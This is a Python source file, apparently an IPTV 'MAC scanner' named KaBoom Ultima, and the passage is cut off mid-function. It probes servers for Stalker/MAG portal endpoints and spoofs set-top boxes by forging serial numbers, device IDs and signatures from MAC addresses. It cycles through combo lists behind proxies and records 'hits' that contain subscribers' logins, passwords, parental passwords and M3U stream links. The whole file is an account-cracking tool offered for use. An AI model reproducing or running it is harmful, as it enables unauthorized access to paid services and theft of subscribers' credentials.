import sys, os
import platform
import subprocess
import pip
from playsound import playsound



try:
    import requests,random
    from colorama import Fore
except:
    os.system('pip install requests')
    os.system('pip install urllib3')
    os.system('pip install colorama')
    os.system('pip install time')

import requests, random, urllib3, time
from colorama import Fore
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)
urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
)
# Get the script name
script_name = os.path.basename(__file__)

feyzo=(f"""\33[0m\33[32m    
╔═════════════════════                
║  Android Scanner w/Portal Checker
║  PY  :  KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ
║  Build  : {script_name}        
║  Sound-On, Exp+Delay Option    
╚═════════════════════                 
\33[0m\33[0;1;5;m""")

os.system("cls" if os.name == "nt" else "clear")
print(feyzo)
print("""\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ	\n\033[1;32m """)

Host=input("Url&Port:\33[0m ")
if 'http://' in Host:
    Host = Host.split("://")[1]
    Host = Host.split('/')[0]
Host = Host.replace('/c/', '')
Host = Host.replace('/c', '')
Host = Host.replace('/', '')

#import requests
#import random

def search_panel(url):
    best_result = {"status": "", "url": ""}

    def print_status(status_code, admin):
        status = "\33[92m"
        fx = ""
        if status_code == 200:
            status = "\33[92m [ 200 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 401:
            status = "\33[95m [ 401 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 403:
            status = "\33[91m [ 403 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 512:
            status = "\33[94m [ 512 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 520:
            status = "\33[95m [ 520 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 404:
            status = "\33[31m [ 404 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 302:
            status = "\33[94m [ 302 ]\33[0m"
            fx = "\33[1;32m"
        print(f"{fx}{status} {admin}\33[0m")
        return status

    payload = [
        '/portal.php',
        '/server/load.php',
        '/portalstb/',
        '/stalker_portal/server/load.php',
        '/c/portal.php',
    ]

    user_agents_list = [
        'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/537.36',
        'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/537.36',
        'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/537.36',
        'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34',
        'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
        'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
        'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0'
    ]

    for admin in payload:
        try:
            get_request = requests.get(url + admin, headers={'User-Agent': random.choice(user_agents_list)}, timeout=5)
            status_code = get_request.status_code
            result = print_status(status_code, admin)

            if result == "\33[92m [ 200 ]\33[0m" and (best_result["status"] != "\33[92m [ 200 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
            if result == "\33[95m [ 401 ]\33[0m" and (best_result["status"] != "\33[95m [ 401 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
            if result == "\33[94m [ 512 ]\33[0m" and (best_result["status"] != "\33[94m [ 512 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin

        except (requests.ConnectionError, requests.Timeout):
            print(f"\33[1;31mNo connection\33[0m for {admin}")

    rerun = input("\n🔸1=Try again or \nEnter to continue: ")
    if rerun.lower() == "1":
        search_panel(url)
    #else:
        #print("\n💫 Continuing 💫")


while True:
    
    url = ("http://"+Host)
    print("\n")
    
    search_panel(url)
    #time.sleep(.5)

    break

try:
	import requests
except:
	print("requests modulo errors\n")
	pip.main(['install', 'requests'])
	import requests
import random, time, datetime
import json, sys, re
import threading
import urllib.request
import socket
import hashlib
import marshal
import base64
import codecs
import pathlib

try:
	import requests
except:
	print("requests module is not loaded\nrequests module is being loaded\n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock module is not loaded\ne sock module is being loaded\n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM:DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
import unicodedata
from urllib.parse import urlsplit
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"
os.system('cls' if os.name == 'nt' else 'clear')
from colorama import Fore, Back, Style
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass

my_os = platform.system()
if (my_os == "Windows"):
    rootDir = "./"
    my_os="Wɪɴᴅᴏᴡs"
else:
    rootDir = "/sdcard/"
    my_os="Aɴᴅʀᴏɪᴅ"
my_cpu = platform.machine()
my_py = platform.python_implementation()
#print("\33[1m\33[1;32m        OS in my system : ", my_os+"\33[0m")
	
if not os.path.exists(rootDir+'Hits'):
    os.makedirs(rootDir+'Hits')
    
if not os.path.exists(rootDir+'combo'):
    os.makedirs(rootDir+'combo')

if not os.path.exists(rootDir+'Proxy'):
    os.makedirs(rootDir+'Proxy')
   
if not os.path.exists('/sdcard/sounds'):
    os.makedirs('/sdcard/sounds')

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning

logging.captureWarnings(True)
from urllib.parse import urlsplit
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"
    

Green="\033[1;33m"
Blue="  \33[1m\33[7;49;94m"
Grey="\033[1;30m"
Reset="\033[0m"
Red="\033[1;31m"
Purple="\033[0;35m"


import time
import socket  # Importe a biblioteca socket
import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)
urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

ses = requests.session()

#copy and pastef from another script
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:"
    "TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:"
    "TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:"
    "TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
)

######

#useragent = "X-User-Agent: Model: MAG250; Link: WiFi"
#useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/537.36"
#useragent="okhttp/4.7.1"
#useragent = "okhttp/4.10.0"
useragent = [
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36', 
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0.2', 
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Yandex/21.6.0.757 Chrome/91.0.4472.124 Safari/537.36', 
 'Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36', 
 'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0', 
 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36']







try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag

def a(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
a("""\n\n \033[1;37;44mKaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ  \33[0m""")
#time.sleep(1)

#nickn=input("""\033[0;94m
#Choose a nickname for the scan
#Nickname: \33[0m""")
#if nickn == '':
#    nickn = 'Duke KaBoom'

cpm=0
cpmx=0
hitr=0
m3uon=0
m3uvpn=0
macon=0
macvpn=0
macexp=0
color=""

def echok(mac,bot,total,hitc,status_code,oran):
	global cpm,hitr,m3uon,m3uvpn,m3uonxmacon,macvpn,macvpn,macon,bib,tokenr,proxies,color,macexp,delay
	bib=0
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	#delay slows down the bots
	time.sleep (int(delay))
	if str(cpmx)=="0":
			cpm=cpm
	else:
				cpm=cpmx

	text ="🔹KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ🔹️ "	
	echo=("""\33[0m
╭─\033[94m🔹KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ🔹️    \33[0m 
├⍟ \33[0mScan Date: """+str(time.strftime('%d-%m-%Y'))+"""  \33[0m 
├⍟ \33[1;33m """+str(panel)+"""   \33[0m
├⍟ \33[0mPortalType: """+str(uzmanm)+"""   \33[0m 
├⍟ \33[0mFile:"""+combodosya+""" \33[0m
├⍟ \33[0mMAC: """+tokenr+str(mac)+"""      \33[0m
├⍟ \33[0mBots: """+str(bot)+""" \33[0m\33[96m CPM"""+str(cpm)+""" \33[0m \33[93mDelay:"""+str(delay)+"""s\33[0m
├⍟ \33[0mPʀᴏᴛᴏᴄᴏʟ:\33[0m\33[91m HTTP\33[0m\33[33m|\33[0m"""+color+str(status_code)+"""\33[0m\33[33m|\33[0m
├⍟ \33[0mTotal: """+str(total)+   """\33[0m\33[0m """ +str(oran)+"""% of \33[0m\033[0;0m"""+str(combouz)+"""   \33[0m
├⍟ \33[0mMacCheck:  \33[92mON: """+str(macon)+""" \33[0m⍟ \33[91mVPN: """+str(macvpn)+"""   \33[0m 
├⍟ \33[0mM3uCheck:  \33[92mON: """+str(m3uon)+""" \33[0m⍟ \33[91mOFF: """+str(m3uvpn)+"""   \33[0m
╰⍟ \33[0m \33[1;44m 🔹 Hits 🔹   """+str(hitr)+"""""" +str(hitc)+""" \33[0m Exp>:"""+str(expdate)+"""d \33[0m
 \33[0m  """+str(proxydosya)+"""




""")
	
	print(echo)
	cpm=time.time()
	if status_code==200:color="\33[1m\33[32m""ᴀᴠᴀɪʟᴀʙʟᴇ : "
	if status_code==301:color="\33[1m\33[1;31m""ʀᴇᴅɪʀᴇᴄᴛ : "
	if status_code==302:color="\33[1m\33[1;31m""ᴍᴏᴠᴇᴅ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ : "
	if status_code==403:color="\33[1m\33[1;31m""Fᴏʀʙɪᴅᴅᴇɴ : "
	if status_code==404:color="\33[1m\33[1;31m""ɴᴏᴛ Fᴏᴜɴᴅ : "
	if status_code==429:color="\33[1m\33[1m\33[93m""ᴍᴀɴʏ ʀᴇqᴜᴇsᴛs : "
	if status_code==500:color="\33[1m\33[1m\33[93m""sᴇʀᴠᴇʀ Eʀʀᴏʀ : "
	if status_code==503:color="\33[1m\33[1m\33[93m""ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ : "
	if status_code==512:color="\33[1m\33[1m\33[93m""Eʀʀᴏʀ : "
	if status_code==520:color="\33[1m\33[35m"	
			
bot=0
hit=0
hitr="\33[1;32m"
tokenr="\33[0m"
oran=""
def bekle(bib,vr):
	i=bib
	
	#animation = [ "[✮]","[✮✩]", "[✮✮✩]", "[✮✮✮✩]", "[✮✮✮✮✩]", "[✮✮✮✮✮✩]", "[✮✮✮✮✮✮✩]", "[✮✮✮✮✮✮✮✩]", "[✮✮✮✮✮✮✮✮✩]", "[✮✮✮✮✮✮✮✮✮✩]", "[✮✮✮✮✮✮✮✮✮✮✩]", "[✮✮✮✮✮✮✮✮✮✮✮✩]", "[✮✮✮✮✮✮✮✮✮✮✮✮✩]", "[✮✮✮✮✮✮✮✮✮✮✮✮✮✩]", "[✮✮✮✮✮✮✮✮✮✮✮✮✮✮✩]"] 
	animation = [
        "\033[38;5;051m⬡⬡⬡⬡⬡⬡⬡⬡⬡⬡   \033[0m",
        "\033[38;5;051m⬢\033[38;5;045m⬡⬡⬡⬡⬡⬡⬡⬡⬡    \033[0m",
        "\033[38;5;051m⬢⬢\033[38;5;045m⬡⬡⬡⬡⬡⬡⬡⬡    \033[0m",
        "\033[38;5;051m⬢⬢⬢\033[38;5;045m⬡⬡⬡⬡⬡⬡⬡    \033[0m",
        "\033[38;5;051m⬢⬢⬢⬢\033[38;5;045m⬡⬡⬡⬡⬡⬡    \033[0m",
        "\033[38;5;051m⬢⬢⬢⬢⬢\033[38;5;045m⬡⬡⬡⬡⬡    \033[0m",
        "\033[38;5;051m⬢⬢⬢⬢⬢⬢\033[38;5;045m⬡⬡⬡⬡    \033[0m",
        "\033[38;5;051m⬢⬢⬢⬢⬢⬢⬢\033[38;5;045m⬡⬡⬡    \033[0m",
        "\033[38;5;051m⬢⬢⬢⬢⬢⬢⬢⬢\033[38;5;045m⬡⬡    \033[0m",
        "\033[38;5;051m⬢⬢⬢⬢⬢⬢⬢⬢⬢\033[38;5;045m⬡    \033[0m",
        "\033[38;5;051m⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢    \033[0m"
    ]

	
	#for i in range(len(animation)):
	time.sleep(0.8)
	sys.stdout.write("\r"  + animation[ i % len(animation)]+'   Checking Proxy ')
	sys.stdout.flush()
	#print('\n')
	
kanalkata="2"
stalker_portal="feyzo"
def hityaz(mac,trh,real,m3ulink,m3uhost,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,country_name,scountry,kanalsayisi,filmsayisi,dizisayisi):
	global hitr,hitsay
	panell=panel
	reall=real
	if 'feyzo' == 'feyzo':#try:
		simza=""
		if uzmanm=="stalker_portal/server/load.php":
			panell=str(panel)+'/stalker_portal'
			reall=real.replace('/c/','/stalker_portal/c/')
			simza="""
			
╭─KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ
├Billing Date """+str(bill)+"""
├Expire Date """+expire_billing_date+"""
├Login """+login+"""
├Password """+password+"""
├FullName """+fname+"""
├XXX Password """+parent_password+"""
├1s """+ls+"""
├Tariff ID """+tariff_plan_id+"""
├Tariff Plan """+tariff_plan+"""
├Max Online """+max_online+"""
├Stb Type """+stb_type+"""
├Country """+country+"""
├Settings Password """+settings_password+"""
╰─Comment """+comment+""" """
		imza=f"""	

╭─✮{script_name} ᴾᴿᴱᴹᴵᵁᴹ
├Scan Date: """+str(time.strftime('%d-%m-%Y'))+"""
├Real Url: """+str(reall)+"""
├Portal type: """+str(uzmanm)+"""
├🔸Portal Url http://"""+str(panell)+"""/c/
├🔸Mac: """+str(mac)+"""
├Exp: """+str(trh)+"""
├Mac Status: """+str(durum)+"""
├M3u: """+m3uimage+"""
├Vpn: """+str(vpn)+"""
├Rᴇɢɪᴏɴ: """+str(country_name)+""" """+data_server(str(scountry))+"""
╰─KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ"""+str(playerapi)+""" """
		sifre=device(mac)
		
		pimza="""
╭─M3u Real URl """+str(m3ulink)+"""
╰─M3u Host Url """+str(m3uhost)+""" """
		imza=imza+simza+sifre
		
		if  len(kanalsayisi) > 1:
			imza=imza+"""
			
╭ """+kanalsayisi+""" Channels
├ """+filmsayisi+"""  Films
├ """+dizisayisi+"""  Series
╰─KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ"""
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+""" 
				
╭─CHANNELS
"""+str(livelist)+"""\n╰─✮"""
		if kanalkata=="2":
			imza=imza+"""  
				
╭─FILMS
╰─"""+str(vodlist)+""" 

╭─SERIES
╰─"""+str(serieslist)+"""

"""
		imza=imza
		yax(imza)
		hitsay=hitsay+1
		print(imza)
		if hitsay >= hit:
			hitr="\33[1;33m"
	#except:pass

def data_server(scountry):
    
    bandera=''
    pais=''
    origen=''
    try:        
        codpais=scountry
        bandera=flag.flag(codpais)
        origen=bandera
    except:pass
    return origen

#import os
	
def device(mac):
	mac=mac.upper()
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+'+'+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper()
	sifre="""

╭─ Serial """+SNENC+"""   
├SerialCut """+SNCUT+"""
├DeviceID1 """+DEVENC+"""
├DeviceID2 """+SINGENC+"""
├Signature """+DEVENC1+"""
╰─ """
	return sifre


def list(listlink,macs,token,livel):
	kategori=""
	veri=""
	bag=0
	while True:
		try:
			res = ses.get(listlink, headers=hea2(macs,token), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break			
	if veri.count('title":"')>1:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
				kategori=kategori.replace("{","")
	list=kategori
	return list

def m3ugoruntu(cid,user,pas,plink):
	durum="ⓃⓄ ⒾⓂ︎ⒶⒼⒺ 📛"
	try:
			url=http+"://"+plink+'/live/'+str(user)+'/'+str(pas)+'/'+str(cid)+'.ts'
			res = ses.get(url,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
			if res.status_code==302:
				durum="ⒺⓍⒾⓈⓉⓈ ✅"
	except:
			durum="ⓃⓄ ⒾⓂ︎ⒶⒼⒺ 📛"
	return durum
hit=0						

def m3uapi(playerlink,mac,token):
	mt=""
	bag=0
	veri=""
	bad=0
	while True:
		try:
			res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:
			if not proxi =="1":
				bad=bad+1
				if bad==3:
					break
	if veri=="" or '404' in veri:
		bad=0
		while True:
			try:
				playerlink=playerlink.replace('player_api.php','panel_api.php')
				res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
				veri=str(res.text)
				break
			except:
				if not proxi =="1":
					bad=bad+1
					if bad==3:
						break
	acon=""
	timezone=""
	message=""
	if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				try:
					timezone=veri.split('timezone":"')[1]
					timezone=timezone.split('",')[0]
					timezone=timezone.replace("\/","/")
				except:pass
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				try:
					message=veri.split('message":"')[1].split(',')[0].replace('"','')
					message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
					mt=("""
╭─KaBoom Ultima
├Message """+str(message)+""" 
├Hits Duke KaBoom 💫
├HostUrl http://"""+panel+"""/c/
├RealUrl http://"""+realm+""":"""+port+"""/c/
├Port """+port+"""
├User """+userm+"""
├Password """+pasm+"""
├Expiration """+bitism+""" 
├Active Connections """+acon+"""
├Max Connections """+mcon+""" 
├Status """+status+"""
├Zone """+timezone+"""
├M3U: http://"""+realm+""":"""+port+"""/get.php?username="""+userm+"""&password="""+pasm+"""&type=m3u_plus
├M3U8: http://"""+realm+""":"""+port+"""/get.php?username="""+userm+"""&password="""+pasm+"""&type=m3u_plus&output=m3u8
├EPG URL: http://"""+realm+""":"""+port+"""/xmltv.php?username="""+userm+"""&password="""+pasm+"""&type=xml_plus
╰─KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ""")
	return mt
	
							
def goruntu(link,cid):
	#print(link)
	say=0
	duru="𝙑𝙋𝙉「 𝙇𝙊𝘾𝙆𝙀𝘿 」🔒 🔴"
	try:
		res = ses.get(link,  headers=hea3(), timeout=10, allow_redirects=False,stream=True)
		#print(res.status_code)
		if res.status_code==302:
			duru="𝙑𝙋𝙉「 𝙐𝙉𝙇𝙊𝘾𝙆𝙀𝘿 」🟢"
	except:
			duru="𝙑𝙋𝙉「 𝙇𝙊𝘾𝙆𝙀𝘿 」🔒 🔴"
	return duru		
		
def url7(cid):
	url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)+"&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http:///ch/"+str(cid)+"&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	return str(url)
	
def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea			
def hitecho(mac,trh):
	if rootDir == "/sdcard":
		sesdosya=rootDir+"/sounds/hit1.mp3"
		file = pathlib.Path(sesdosya)
		try:
			if file.exists():
			   ad.mediaPlay(sesdosya)
		except:pass
	print("""
"""+str(panel)+"""
"""+str(mac)+"""
"""+str(trh)+"""          """)		
def unicode(fyz):
	cod=fyz.encode('utf-8').decode("unicode-escape").replace('\/','/')
	return cod

def duzel2(veri,vr):
	data=""
	try:
		data=veri.split('"'+str(vr)+'":"')[1]
		data=data.split('"')[0]
		data=data.replace('"','')
		data=unicode(data)
	except:pass
	return str(data)
				
def duzelt1(veri,vr):
	data=veri.split(str(vr)+'":"')[1]
	data=data.split('"')[0]
	data=data.replace('"','')
	return str(data)
				
									
#import datetime
#import time
#import hashlib
#import urllib
def url2(mac,random):
	macs=mac.upper()
	macs=urllib.parse.quote(macs)
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper() #signature
	url22=http+"://"+panel+"/"+uzmanm+"?action=get_profile&type=stb&&sn=""&device_id=""&device_id2="""
	if uzmanm=="stalker_portal/server/load.php":
	    times=time.time()
	    url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp='+str(times)+'&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml'
	    if stalker_portal=="2":
